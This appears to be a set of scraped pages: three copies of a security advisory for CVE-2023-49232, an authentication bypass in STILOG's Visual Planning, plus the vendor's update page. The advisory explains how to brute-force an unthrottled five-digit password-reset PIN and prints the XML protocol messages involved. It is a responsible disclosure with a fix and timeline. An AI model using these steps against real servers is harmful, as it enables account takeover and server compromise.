=== Content from seclists.org_a51ad408_20250110_192329.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](1)
[By Date](date.html#2)
[![Next](/images/right-icon-16x16.png)](3)

[![Previous](/images/left-icon-16x16.png)](1)
[By Thread](index.html#2)
[![Next](/images/right-icon-16x16.png)](3)

![](/shared/images/nst-icons.svg#search)

# SCHUTZWERK-SA-2023-004: Authentication Bypass via Password Reset Functionality in Visual Planning

---

*From*: Lennert Preuth via Fulldisclosure <fulldisclosure () seclists org>

*Date*: Wed, 3 Apr 2024 17:12:22 +0200

---

```

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Title
=====

```
SCHUTZWERK-SA-2023-004: Authentication Bypass via Password Reset
Functionality in Visual Planning
```

Status
======

PUBLISHED

Version
=======

1.0

CVE reference
=============

CVE-2023-49232

Link
====

<https://www.schutzwerk.com/advisories/schutzwerk-sa-2023-004/>

Text-only version:
<https://www.schutzwerk.com/advisories/SCHUTZWERK-SA-2023-004.txt>

Affected products/vendor
========================

All versions prior to Visual Planning 8 (Build 240207) by STILOG I.S.T.

Summary
=======

```
Unauthenticated attackers can exploit a weakness in the password reset
functionality of the Visual Planning[0] application in order to obtain
access to arbitrary user accounts including administrators. In case
administrative (in the context of Visual Planning) accounts are
compromised, attackers can install malicious modules into the
application to take over the application server hosting the Visual
Planning application.
```

Risk
====

```
The application does not impose any limits on the number of guesses that
can be made. Attackers can therefore initiate the reset for arbitrary
users and automate the pin validation process until a valid pin is
obtained. The vulnerability allows unauthenticated attackers to gain
access to arbitrary user accounts including administrators.
```

```
Failed pin validation attempts are not logged by the application which
greatly increases the difficulty of detecting ongoing attacks.
```

```
With administrative access to Admin Center, attackers can install
malicious modules containing Java code that is executed on the
application server, resulting in arbitrary command execution.
```

The entire pin space can be enumerated in approximately one to two hours.

Description
===========

```
During a recent red teaming assessment, Visual Planning was identified
as part of the customers internet-facing assets. The software is
developed by STILOG I.S.T. and provides resource management and
scheduling features. A security assessment conducted by SCHUTZWERK found
an authentication bypass in Visual Planning's password reset functionality.
The application Admin Center (vpadmin) communicates with the server
through an XML-based protocol that utilizes proprietary compression
methods and is transmitted via HTTP. SCHUTZWERK implemented a custom
proxy as part of an assessment in order to intercept and manipulate the
messages exchanged between application and server.
```

```
One of the first messages sent by the Admin Center application after
launch is the following:
```

<?xml version="1.0" encoding="UTF-8"?>
<com.visualplanning.query.NamedMethodParameter>
<methodName>canResetPassword</methodName>
<rawResult>false</rawResult>
<userSession isNull="true"/>
<values/>
</com.visualplanning.query.NamedMethodParameter>

```
In this request, the client asks the server whether it should display
the "Forgot your password ?" button as part of the login form. During
the assessment, the server responded as follows:
```

<?xml version="1.0" encoding="UTF-8"?>
<com.visualplanning.query.QueryResult>
<resultValues>
<HashtableValue>
<key>resetPassword</key>
<value class="java.lang.Boolean">false</value>
</HashtableValue>
</resultValues>
<status>OK</status>
</com.visualplanning.query.QueryResult>

```
By altering the value to "true", the password reset functionality
becomes accessible in the application. At this point, attackers can
provide the target username. This causes a request similar to the
following to be issued:
```

<?xml version="1.0" encoding="UTF-8"?>
<com.visualplanning.query.NamedMethodParameter>
<methodName>sendResetPasswwd</methodName>
<rawResult>false</rawResult>
<userSession isNull="true"/>
<values>
<HashtableValue>
<key>login</key>
<value class="String">admin</value>
</HashtableValue>
</values>
</com.visualplanning.query.NamedMethodParameter>

```
While handling this request, the server generates a five digit numeric
pin and tries to send it to the email address associated with the
provided username. Regardless of whether the email could be successfully
transmitted, the generated pin is stored in a attribute of the session
used while performing the reset. It should be noted that the password
reset request message can be sent directly without enabling the button
in the GUI if the message format is already known.
```

```
To complete the reset process, the correct pin (matching the pin stored
in the session attribute) must be specified. A message similar to the
following is issued by the application to validiate the provided pin:
```

<?xml version="1.0" encoding="UTF-8"?>
<com.visualplanning.query.NamedMethodParameter>
<methodName>validateResetPasswwd</methodName>
<rawResult>false</rawResult>
<userSession isNull="true"/>
<values>
<HashtableValue>
<key>login</key>
<value class="String">admin</value>
</HashtableValue>
<HashtableValue>
<key>userCode</key>
<value class="String">58344</value>
</HashtableValue>
</values>
</com.visualplanning.query.NamedMethodParameter>

```
When an invalid pin is provided, the server responds with the following
XML document:
```

<?xml version="1.0" encoding="UTF-8"?>
<com.visualplanning.query.QueryResult>
<resultValues>
<HashtableValue>
<key>ERROR</key>
<value class="String">Invalid code.</value>
</HashtableValue>
</resultValues>
<status>KO</status>
</com.visualplanning.query.QueryResult>

```
In case the pin is valid, the server responds with a VPUser data
structure similar to the following:
```

<?xml version="1.0" encoding="UTF-8"?>
<com.visualplanning.query.QueryResult>
<resultValues>
<HashtableValue>
<key>vpUser</key>
<value class="com.visualplanning.data.admin.VPUser">
<ID>1</ID>
<UID>C442-53EB-B185-8804-F6BF-70AC-61C3-31BC</UID>
<activated>true</activated>
<comments>Super administrateur</comments>
<email>yahd6Coo () schutzwerk com</email>
<expiredPasswd>false</expiredPasswd>
<groups/>
<imageProfilBase64></imageProfilBase64>
<ldapSetting>
<entityID>-1</entityID>
</ldapSetting>
<licenses/>
<loginAttemps>0</loginAttemps>
<mobilePhoneNumber></mobilePhoneNumber>
<name>admin</name>
<ownerID>0</ownerID>
<phoneNumber></phoneNumber>
<platform>VP</platform>
<resetPasswd>true</resetPasswd>
<resourceUser>false</resourceUser>
</value>
</HashtableValue>
</resultValues>
<status>OK</status>
</com.visualplanning.query.QueryResult>

```
In addition, an empty password is set for the target username. Upon
first login after reset, a new password must be set for this user.
```

Solution/Mitigation
===================

The vendor suggests to update to Visual Planning 8 (Build 240207)

Disclosure timeline
===================

2023-11-01: Vulnerability discovered
2023-11-09: Contact vendor in order to determine security contact
2023-11-10: Received generic sales response from vendor
2023-11-14: Contacted CTO of vendor directly
2023-11-16: Vulnerabilities demonstrated in call with contact at vendor
2023-11-24: CVE assigned by Mitre
2023-11-24: Additional technical details provided to vendor

```
2023-12-19: Vendor informed SCHUTZWERK that work on fixing the findings
is in progress
2024-01-30: Inquired about mitigation status regarding the reported
vulnerabilities
2024-01-30: Vendor informed SCHUTZWERK that some of the issues were
already fixed
```

2024-03-08: Sent advisory drafts to vendor
2024-03-28: Received patch information and release of advisory

Contact/Credits
===============

```
The vulnerability was discovered during an assessment by Lennert Preuth
and David Brown of SCHUTZWERK GmbH.
```

References
==========

[0] <https://www.visual-planning.com/en/>

```
[1]
<https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html>
```

Disclaimer
==========

```
The information provided in this security advisory is provided "as is"
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
most recent version of this security advisory can be found at SCHUTZWERK
GmbH's website ( <https://www.schutzwerk.com> ).
```

Additional information
======================

SCHUTZWERK Advisories: <https://www.schutzwerk.com/blog/tags/advisories/>

SCHUTZWERK Advisory Policy: <https://www.schutzwerk.com/en/advisories/>
-----BEGIN PGP SIGNATURE-----

iQJOBAEBCgA4FiEEgLsg7Oj/wY3LSF87GrXfkTIXLrsFAmYF0TAaHGFkdmlzb3Jp
ZXNAc2NodXR6d2Vyay5jb20ACgkQGrXfkTIXLrtU9xAArJL5rKh3sNRto6xC7bgj
660J6OALXG9O9qaJo1RHYsVo9287THvSgsPs8/YXZhFNtkccsdxRll3t3UxC3IOU
/h+f612I4lFlk9t0LVH2eu6r8lTw47YLbO9RKoBF0TsysJMnytuM9+BxRyd+nLVo
rfVxmRfUhDKf5odkDz8IeatmMMeI1e7JuGylWtVOkSxdbCsmwEbObrEsCwe74AR4
PKJDVb6tq03q1g5H0yq7QLCMyuN7UBc0Jb/sYkL3hu0m7JlqyCVUfNBaD1pqZvlA
C3b+DnrJHwAPYKr5I4pKfss5Ghh3+yIaS/UIyaIImgS6pyBDOJUHULiMKumZYHCl
r3YWOLAjuTUztRmsktavjgItsf2NsXnBLYMDjZuZtBd6iU7iNKQ4EdbCNt8YCN8w
KmU3ot2Kwjty2aLj7CBdg8Mrc4Rr3PH2PoXWxSEBMWqokoO2zWVft+5BpJ/onU2P
um41+KNb7h7Pf/QVkU1KOZbwAI9tgJvZn2hHXmbQov0w3s0J9dqNoJ4Eu+qVPMAx
+Ug9Qvo3Qh325pDEeqxUhOsPh4dHam97ouDYE3XXLlKk8rar8TjhANAHHO4uUltW
gikWB1VVmGy7XS9lflWE1QLqO8BBK1jZUDU21fWQeAeF64R6NXikj0tkfvjOwwt/
CTQ2Nugk2kdYf5d73FSO9ds=
=PvYR
-----END PGP SIGNATURE-----

--
SCHUTZWERK GmbH, Pfarrer-Weiß-Weg 12, 89077 Ulm, Germany
Zertifiziert / Certified ISO 27001, 9001 and TISAX

Phone +49 731 977 191 0

advisories () schutzwerk com / www.schutzwerk.com

Geschäftsführer / Managing Directors:
Jakob Pietzka, Michael Schäfer

Amtsgericht Ulm / HRB 727391
Datenschutz / Data Protection www.schutzwerk.com/datenschutz

```

**Attachment:
[OpenPGP\_signature.asc](att-2/OpenPGP_signature_asc.bin)**

*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <https://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](1)
[By Date](date.html#2)
[![Next](/images/right-icon-16x16.png)](3)

[![Previous](/images/left-icon-16x16.png)](1)
[By Thread](index.html#2)
[![Next](/images/right-icon-16x16.png)](3)

### Current thread:

* **SCHUTZWERK-SA-2023-004: Authentication Bypass via Password Reset Functionality in Visual Planning** *Lennert Preuth via Fulldisclosure (Apr 05)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.visual-planning.com_566e5039_20250110_192329.html ===
 ![LOGO-Visual-Planning-espace-clients-250](https://www.visual-planning.com/en/wp-content/uploads/2022/04/LOGO-Visual-Planning-espace-clients-250.png)

* [Support Portal](https://www.visual-planning.com/en/support-portal)
* [HotTicket](https://www.visual-planning.com/en/support-portal/hotticket)
* [Updates](https://www.visual-planning.com/en/support-portal/updates)
* Tools
  + [VPDeskLauncher](https://www.visual-planning.com/en/support-portal/vpdesk-new-launcher)
  + [Remote support](https://www.visual-planning.com/en/support-portal/remote-support)
* [Knowledge Base](https://www.visual-planning.com/en/support-portal/knowledge-base)
* [![Back to Visual Planning](https://www.visual-planning.com/en/wp-content/uploads/2021/01/cropped-LOGO-VP-Flat-icon-300x300.png "Retour menu principal")](https://www.visual-planning.com/en/)

# Visual Planning Update

## Make sure you have the latestfeatures of your software

![](https://www.visual-planning.com/en/wp-content/uploads/2021/12/mise-a-jour-visual-planning.jpg)
## Visual Planning Update

### I HAVE VISUAL PLANNING 9 INSTALLED ON MY SERVER

To update your Visual Planning installation with the latest build release, please simply enter your serial number in the box below and [follow the instructions from our self-help knowledge base.](https://www.visual-planning.com/documentation/env9/home/installing-updating-visual-planning-entreprise/minor-updates-unistalling-vp-enterprise "How to install a minor build release in Visual Planning 9 Enterprise.")

### I DO NOT HAVE VISUAL PLANNING 9 BUT HAVE AN OLDER VISUAL PLANNING INSTALLATION

If you currently have a valid maintenance contract with us, you can upgrade to Visual Planning 9 for free and download Visual Planning 9 install files by entering your serial number in the box below. Please then follow steps to complete the 9 upgrade [as described in this section of the documentation](https://www.visual-planning.com/documentation/env9/home/installing-updating-visual-planning-entreprise/major-updates-vp-enterprise).

### I NEED HELP WITH MY VISUAL PLANNING UPDATE

Please refer to our [self-help knowledge base](https://www.visual-planning.com/en/support-portal/knowledge-base "Visual Planning self-help knowledge base") or contact our helpdesk through support@stilog.com.

### DOWNLOAD OUR LATEST UPDATE:

    ![logo visual planning blanc](https://www.visual-planning.com/en/wp-content/uploads/2021/11/LOGO-VisualPlanning-blanc1.png "LOGO-VisualPlanning-blanc1") [![logo stilog blanc](https://www.visual-planning.com/en/wp-content/uploads/2021/11/LOGO-STILOG-blanc-250.png "LOGO-STILOG-blanc-250")](https://stilog.com/en/) [![ICE Groupe logo 2023](https://www.visual-planning.com/en/wp-content/uploads/2020/08/Logo_ICE_Groupe_2023_blanc_100.png "Logo_ICE_Groupe_2023_blanc_100")](https://www.icegroupe.com/)
#### Our competences

* [Project Management](https://www.visual-planning.com/en/why-visual-planning/solutions/project-management-software)
* [Construction Scheduling](https://www.visual-planning.com/en/why-visual-planning/solutions/construction-scheduling-software)
* [Field Service Scheduling](https://www.visual-planning.com/en/why-visual-planning/solutions/field-service-scheduling)
* [Employee scheduling software & time tracking](https://www.visual-planning.com/en/why-visual-planning/solutions/employee-scheduling-software)
* [Fleet Management](https://www.visual-planning.com/en/why-visual-planning/solutions/fleet-management)
* [Production Scheduling Software](https://www.visual-planning.com/en/why-visual-planning/solutions/production-scheduling-software)
* [CRM](https://www.visual-planning.com/en/why-visual-planning/solutions/crm)
#### Read more

* [The Company](https://www.visual-planning.com/en/company)
* [Partnership Program](https://www.visual-planning.com/en/company/partner-directory)
* [Partner Directory](https://www.visual-planning.com/en/company/partner-directory/our-partners)
* [Case Studies & Testimonials](https://www.visual-planning.com/en/resources/case-studies-testimonials)
* [Blog](https://www.visual-planning.com/en/resources/blog)
* [Recruitment](https://stilog.com/fr/carriere/)
* [Sitemap](https://www.visual-planning.com/en/sitemap)
* [Ask a question](https://www.visual-planning.com/en/company/ask-a-question)
Follow us

* [Follow](https://www.linkedin.com/company/visualplanning/posts/?feedView=all&viewAsMember=true "Follow on LinkedIn")
* [Follow](https://www.youtube.com/user/TheVisualplanning "Follow on Youtube")
* [Follow](https://twitter.com/visualplanning "Follow on X")
* [Follow](https://www.facebook.com/visualplanningALL "Follow on Facebook")

Download our mobile application Visual Planning VPGO

[![](https://www.visual-planning.com/en/wp-content/uploads/2022/05/logo-google-play-150.png)](https://play.google.com/store/apps/details?id=com.stilog.VPGOU "Get VPGO on Google Play") [![logo-app-store-150](https://www.visual-planning.com/en/wp-content/uploads/2022/05/logo-app-store-150.png)](https://apps.apple.com/us/app/vpgo-u/id1598862750 "Get VPGO on the AppStore")

    Subscribe to Visual Planning Newsletters

Copyrights [Stilog I.S.T.](https://stilog.com/en/ "Our company") 1996-2025 | Visual Planning © is a registred trademark of Stilog I.S.T. | [Credits](https://www.visual-planning.com/en/credits "Credits") | [Terms & conditions](https://www.visual-planning.com/en/terms-conditions) | [Legales](https://www.visual-planning.com/en/legales-2) | [GDPR](https://www.visual-planning.com/en/blog/visual-planning-complying-gdpr) | Non-contactual photos

 ![Recevez nos dernières informations et mises à jour sur Visual Planning](https://www.visual-planning.com/en/wp-content/plugins/bloom/images/premade-image-01.png)
## Recevez nos dernières informations et mises à jour sur Visual Planning

     Je m'inscris !
## Merci pour votre inscription !

  ![Get resource management and scheduling tips and tricks](https://www.visual-planning.com/en/wp-content/plugins/bloom/images/premade-image-01.png)
## Get resource management and scheduling tips and tricks

News, software updates, fairs and much more...

  Subscribe!
## Thank you for your registration!

         ![](https://px.ads.linkedin.com/collect/?pid=2960778&fmt=gif)

=== Content from www.schutzwerk.com_2fc1300a_20250110_192329.html ===
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Title
=====
SCHUTZWERK-SA-2023-004: Authentication Bypass via Password Reset Functionality in Visual Planning
Status
======
PUBLISHED
Version
=======
1.0
CVE reference
=============
CVE-2023-49232
Link
====
https://www.schutzwerk.com/advisories/schutzwerk-sa-2023-004/
Text-only version:
https://www.schutzwerk.com/advisories/SCHUTZWERK-SA-2023-004.txt
Affected products/vendor
========================
All versions prior to Visual Planning 8 (Build 240207) by STILOG I.S.T.
Summary
=======
Unauthenticated attackers can exploit a weakness in the password reset functionality of the Visual Planning[0] application in order to obtain access to arbitrary user accounts including administrators. In case administrative (in the context of Visual Planning) accounts are compromised, attackers can install malicious modules into the application to take over the application server hosting the Visual Planning application.
Risk
====
The application does not impose any limits on the number of guesses that can be made. Attackers can therefore initiate the reset for arbitrary users and automate the pin validation process until a valid pin is obtained. The vulnerability allows unauthenticated attackers to gain access to arbitrary user accounts including administrators.
Failed pin validation attempts are not logged by the application which greatly increases the difficulty of detecting ongoing attacks.
With administrative access to Admin Center, attackers can install malicious modules containing Java code that is executed on the application server, resulting in arbitrary command execution.
The entire pin space can be enumerated in approximately one to two hours.
Description
===========
During a recent red teaming assessment, Visual Planning was identified as part of the customers internet-facing assets. The software is developed by STILOG I.S.T. and provides resource management and scheduling features. A security assessment conducted by SCHUTZWERK found an authentication bypass in Visual Planning's password reset functionality.
The application Admin Center (vpadmin) communicates with the server through an XML-based protocol that utilizes proprietary compression methods and is transmitted via HTTP. SCHUTZWERK implemented a custom proxy as part of an assessment in order to intercept and manipulate the messages exchanged between application and server.
One of the first messages sent by the Admin Center application after launch is the following:
xml version="1.0" encoding="UTF-8"?
canResetPassword
false

In this request, the client asks the server whether it should display the "Forgot your password ?" button as part of the login form. During the assessment, the server responded as follows:
xml version="1.0" encoding="UTF-8"?
resetPassword
false

OK

By altering the value to "true", the password reset functionality becomes accessible in the application. At this point, attackers can provide the target username. This causes a request similar to the following to be issued:
xml version="1.0" encoding="UTF-8"?
sendResetPasswwd
false

login
admin

While handling this request, the server generates a five digit numeric pin and tries to send it to the email address associated with the provided username. Regardless of whether the email could be successfully transmitted, the generated pin is stored in a attribute of the session used while performing the reset. It should be noted that the password reset request message can be sent directly without enabling the button in the GUI if the message format is already known.
To complete the reset process, the correct pin (matching the pin stored in the session attribute) must be specified. A message similar to the following is issued by the application to validiate the provided pin:
xml version="1.0" encoding="UTF-8"?
validateResetPasswwd
false

login
admin

userCode
58344

When an invalid pin is provided, the server responds with the following XML document:
xml version="1.0" encoding="UTF-8"?
ERROR
Invalid code.

KO

In case the pin is valid, the server responds with a VPUser data structure similar to the following:
xml version="1.0" encoding="UTF-8"?
vpUser
1
C442-53EB-B185-8804-F6BF-70AC-61C3-31BC
true
Super administrateur
yahd6Coo@schutzwerk.com
false

-1

0

admin
0

VP
true
false

OK

In addition, an empty password is set for the target username. Upon first login after reset, a new password must be set for this user.
Solution/Mitigation
===================
The vendor suggests to update to Visual Planning 8 (Build 240207)
Disclosure timeline
===================
2023-11-01: Vulnerability discovered
2023-11-09: Contact vendor in order to determine security contact
2023-11-10: Received generic sales response from vendor
2023-11-14: Contacted CTO of vendor directly
2023-11-16: Vulnerabilities demonstrated in call with contact at vendor
2023-11-24: CVE assigned by Mitre
2023-11-24: Additional technical details provided to vendor
2023-12-19: Vendor informed SCHUTZWERK that work on fixing the findings is in progress
2024-01-30: Inquired about mitigation status regarding the reported vulnerabilities
2024-01-30: Vendor informed SCHUTZWERK that some of the issues were already fixed
2024-03-08: Sent advisory drafts to vendor
2024-03-28: Received patch information and release of advisory
Contact/Credits
===============
The vulnerability was discovered during an assessment by Lennert Preuth and David Brown of SCHUTZWERK GmbH.
References
==========
[0] https://www.visual-planning.com/en/
[1] https://cheatsheetseries.owasp.org/cheatsheets/Forgot\_Password\_Cheat\_Sheet.html
Disclaimer
==========
The information provided in this security advisory is provided "as is" and without warranty of any kind. Details of this security advisory may be updated in order to provide as accurate information as possible. The most recent version of this security advisory can be found at SCHUTZWERK GmbH's website ( https://www.schutzwerk.com ).
Additional information
======================
SCHUTZWERK Advisories: https://www.schutzwerk.com/blog/tags/advisories/
SCHUTZWERK Advisory Policy: https://www.schutzwerk.com/en/advisories/
-----BEGIN PGP SIGNATURE-----
iQJOBAEBCgA4FiEEgLsg7Oj/wY3LSF87GrXfkTIXLrsFAmYF0TAaHGFkdmlzb3Jp
ZXNAc2NodXR6d2Vyay5jb20ACgkQGrXfkTIXLrtU9xAArJL5rKh3sNRto6xC7bgj
660J6OALXG9O9qaJo1RHYsVo9287THvSgsPs8/YXZhFNtkccsdxRll3t3UxC3IOU
/h+f612I4lFlk9t0LVH2eu6r8lTw47YLbO9RKoBF0TsysJMnytuM9+BxRyd+nLVo
rfVxmRfUhDKf5odkDz8IeatmMMeI1e7JuGylWtVOkSxdbCsmwEbObrEsCwe74AR4
PKJDVb6tq03q1g5H0yq7QLCMyuN7UBc0Jb/sYkL3hu0m7JlqyCVUfNBaD1pqZvlA
C3b+DnrJHwAPYKr5I4pKfss5Ghh3+yIaS/UIyaIImgS6pyBDOJUHULiMKumZYHCl
r3YWOLAjuTUztRmsktavjgItsf2NsXnBLYMDjZuZtBd6iU7iNKQ4EdbCNt8YCN8w
KmU3ot2Kwjty2aLj7CBdg8Mrc4Rr3PH2PoXWxSEBMWqokoO2zWVft+5BpJ/onU2P
um41+KNb7h7Pf/QVkU1KOZbwAI9tgJvZn2hHXmbQov0w3s0J9dqNoJ4Eu+qVPMAx
+Ug9Qvo3Qh325pDEeqxUhOsPh4dHam97ouDYE3XXLlKk8rar8TjhANAHHO4uUltW
gikWB1VVmGy7XS9lflWE1QLqO8BBK1jZUDU21fWQeAeF64R6NXikj0tkfvjOwwt/
CTQ2Nugk2kdYf5d73FSO9ds=
=PvYR
-----END PGP SIGNATURE-----

=== Content from www.schutzwerk.com_a0cb5841_20250110_192329.html ===
![](data:image/svg+xml...)
diamond\_fulldiamonddiamond\_halfdiamond\_eurosearch-iconmenuchat-iconclose-iconenvelope-iconsmartphone-call-icon

* Leistungen
  + [PrÃ¼fung](https://www.schutzwerk.com/pruefung)
  + [Beratung](https://www.schutzwerk.com/beratung)
  + [Prozesse](https://www.schutzwerk.com/prozesse)
  + [FÃ¶rderungen](https://www.schutzwerk.com/foerderungen)
  + [Referenzen](https://www.schutzwerk.com/referenzen)
  + [Advisories](https://www.schutzwerk.com/advisories)
* Unternehmen
  + [Blog & News](https://www.schutzwerk.com/blog)
  + [Wir Ã¼ber uns](https://www.schutzwerk.com/wir-ueber-uns)
  + [Team](https://www.schutzwerk.com/team)
  + [Partner](https://www.schutzwerk.com/partner)
  + [Zertifizierungen](https://www.schutzwerk.com/zertifizierung)* + Advisory: Authentication Bypass via Password Reset Functionality in Visual Planning (CVE-2023-49232)
* Karriere
  + [Freie Stellen](https://www.schutzwerk.com/freie-stellen)
  + [Warum Bewerben?](https://www.schutzwerk.com/warum-bewerben)
[![SCHUTZWERK-logo](https://www.schutzwerk.com/media/schutzwerk_logo.svg)](https://www.schutzwerk.com/)

---

[![language-icon](https://www.schutzwerk.com/media/icons/en.svg)](https://www.schutzwerk.com/en/blog/schutzwerk-sa-2023-004/)
[![contact-icon](https://www.schutzwerk.com/media/contact/mail.svg)](https://www.schutzwerk.com/ansprechpartner/)

![burgermenu-icon](https://www.schutzwerk.com/media/icons/bars.svg)[![SCHUTZWERK-logo](https://www.schutzwerk.com/media/schutzwerk_logo.svg)](https://www.schutzwerk.com/)

---

[![language-icon](https://www.schutzwerk.com/media/icons/en.svg)](https://www.schutzwerk.com/en/blog/schutzwerk-sa-2023-004/)
[![contact-icon](https://www.schutzwerk.com/media/contact/mail.svg)](https://www.schutzwerk.com/ansprechpartner/)
![close-icon](https://www.schutzwerk.com/media/icons/close.svg)
Leistungen

[* PrÃ¼fung](https://www.schutzwerk.com/pruefung)[* Beratung](https://www.schutzwerk.com/beratung)[* Prozesse](https://www.schutzwerk.com/prozesse)[* FÃ¶rderungen](https://www.schutzwerk.com/foerderungen)[* Referenzen](https://www.schutzwerk.com/referenzen)[* Advisories](https://www.schutzwerk.com/advisories)
Unternehmen

[* Blog & News](https://www.schutzwerk.com/blog)[* Wir Ã¼ber uns](https://www.schutzwerk.com/wir-ueber-uns)[* Team](https://www.schutzwerk.com/team)[* Partner](https://www.schutzwerk.com/partner)[* Zertifizierungen](https://www.schutzwerk.com/zertifizierung)
Karriere

[* Freie Stellen](https://www.schutzwerk.com/freie-stellen)[* Warum Bewerben?](https://www.schutzwerk.com/warum-bewerben)
Kontakt

[* Ansprechpartner](https://www.schutzwerk.com/ansprechpartner)[* Anfahrt und Parken](https://www.schutzwerk.com/anfahrt-und-parken)
# Blog & News

### 28. MÃ¤rz, 2024

[#ADVISORIES](https://www.schutzwerk.com/blog/tags/advisories/)
## Advisory: Authentication Bypass via Password Reset Functionality in Visual Planning (CVE-2023-49232)

## Release of SCHUTZWERK-SA-2023-004

![preview-image for SCHUTZWERK-SA-2023-004](https://www.schutzwerk.com/blog/schutzwerk-sa-2023-004/security_advisory_banner.png)
```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Title
=====

SCHUTZWERK-SA-2023-004: Authentication Bypass via Password Reset Functionality in Visual Planning

Status
======

PUBLISHED

Version
=======

1.0

CVE reference
=============

CVE-2023-49232

Link
====

https://www.schutzwerk.com/advisories/schutzwerk-sa-2023-004/

Text-only version:
https://www.schutzwerk.com/advisories/SCHUTZWERK-SA-2023-004.txt

Affected products/vendor
========================

All versions prior to Visual Planning 8 (Build 240207) by STILOG I.S.T.

Summary
=======

Unauthenticated attackers can exploit a weakness in the password reset functionality of the Visual Planning[0] application in order to obtain access to arbitrary user accounts including administrators. In case administrative (in the context of Visual Planning) accounts are compromised, attackers can install malicious modules into the application to take over the application server hosting the Visual Planning application.

Risk
====

The application does not impose any limits on the number of guesses that can be made. Attackers can therefore initiate the reset for arbitrary users and automate the pin validation process until a valid pin is obtained. The vulnerability allows unauthenticated attackers to gain access to arbitrary user accounts including administrators.

Failed pin validation attempts are not logged by the application which greatly increases the difficulty of detecting ongoing attacks.

With administrative access to Admin Center, attackers can install malicious modules containing Java code that is executed on the application server, resulting in arbitrary command execution.

The entire pin space can be enumerated in approximately one to two hours.

Description
===========

During a recent red teaming assessment, Visual Planning was identified as part of the customers internet-facing assets. The software is developed by STILOG I.S.T. and provides resource management and scheduling features. A security assessment conducted by SCHUTZWERK found an authentication bypass in Visual Planning's password reset functionality.
The application Admin Center (vpadmin) communicates with the server through an XML-based protocol that utilizes proprietary compression methods and is transmitted via HTTP. SCHUTZWERK implemented a custom proxy as part of an assessment in order to intercept and manipulate the messages exchanged between application and server.

One of the first messages sent by the Admin Center application after launch is the following:

<?xml version="1.0" encoding="UTF-8"?>
<com.visualplanning.query.NamedMethodParameter>
<methodName>canResetPassword</methodName>
<rawResult>false</rawResult>
<userSession isNull="true"/>
<values/>
</com.visualplanning.query.NamedMethodParameter>

In this request, the client asks the server whether it should display the "Forgot your password ?" button as part of the login form. During the assessment, the server responded as follows:

<?xml version="1.0" encoding="UTF-8"?>
<com.visualplanning.query.QueryResult>
<resultValues>
<HashtableValue>
<key>resetPassword</key>
<value class="java.lang.Boolean">false</value>
</HashtableValue>
</resultValues>
<status>OK</status>
</com.visualplanning.query.QueryResult>

By altering the value to "true", the password reset functionality becomes accessible in the application. At this point, attackers can provide the target username. This causes a request similar to the following to be issued:

<?xml version="1.0" encoding="UTF-8"?>
<com.visualplanning.query.NamedMethodParameter>
<methodName>sendResetPasswwd</methodName>
<rawResult>false</rawResult>
<userSession isNull="true"/>
<values>
<HashtableValue>
<key>login</key>
<value class="String">admin</value>
</HashtableValue>
</values>
</com.visualplanning.query.NamedMethodParameter>

While handling this request, the server generates a five digit numeric pin and tries to send it to the email address associated with the provided username. Regardless of whether the email could be successfully transmitted, the generated pin is stored in a attribute of the session used while performing the reset. It should be noted that the password reset request message can be sent directly without enabling the button in the GUI if the message format is already known.

To complete the reset process, the correct pin (matching the pin stored in the session attribute) must be specified. A message similar to the following is issued by the application to validiate the provided pin:

<?xml version="1.0" encoding="UTF-8"?>
<com.visualplanning.query.NamedMethodParameter>
<methodName>validateResetPasswwd</methodName>
<rawResult>false</rawResult>
<userSession isNull="true"/>
<values>
<HashtableValue>
<key>login</key>
<value class="String">admin</value>
</HashtableValue>
<HashtableValue>
<key>userCode</key>
<value class="String">58344</value>
</HashtableValue>
</values>
</com.visualplanning.query.NamedMethodParameter>

When an invalid pin is provided, the server responds with the following XML document:

<?xml version="1.0" encoding="UTF-8"?>
<com.visualplanning.query.QueryResult>
<resultValues>
